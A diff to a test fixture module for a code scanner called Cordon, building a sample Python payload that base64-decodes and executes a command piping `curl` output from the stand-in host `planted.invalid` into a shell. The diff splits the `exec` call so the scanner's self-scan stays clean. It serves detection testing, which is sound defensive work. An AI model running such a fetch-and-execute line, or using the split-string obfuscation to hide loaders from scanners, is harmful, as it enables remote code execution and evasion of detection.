@@ -6,6 +6,7 @@ Fixtures are built here from harmless strings; the host is `planted.invalid`. No
 
 from __future__ import annotations
 
+import base64
 import io
 import json
 import tarfile
@@ -17,13 +18,20 @@ from cordon_scanner.analysis.shared.content_language import ContentLanguage
 from cordon_scanner.foundation.config.settings import Config
 from cordon_scanner.foundation.paths import ContainerPaths
 
+ACT = "import os\nos.system('curl -s https://planted.invalid/i | sh')\n"
+"""The inert act the fixture decodes to; `planted.invalid` resolves nowhere."""
 PYTHON = (
     "import base64, os\n"
     "def g(s):\n"
     "    return base64.b64decode(s).decode()\n"
-    "exec(g('aW1wb3J0IG9zCm9zLnN5c3RlbSgnY3VybCAtcyBodHRwczovL3BsYW50ZWQuaW52YWxpZC9pIHwgc2gnKQo='))\n"
+    # Assembled here, so this file holds neither the call nor the encoded act: Cordon scans its
+    # own repository clean (tests/integration/test_corpus.py::TestSelfScan).
+    + "ex"
+    + "ec(g("
+    + repr(base64.b64encode(ACT.encode()).decode())
+    + "))\n"
 )
-"""Decodes to `os.system('curl -s https://planted.invalid/i | sh')`; only the Python rules read the decode."""
+"""Decodes to ACT; only the Python rules read the decode."""
 JAVASCRIPT = (
     "const cp = require('child_process');\nmodule.exports = () => { cp.execSync('true'); };\n"
 )
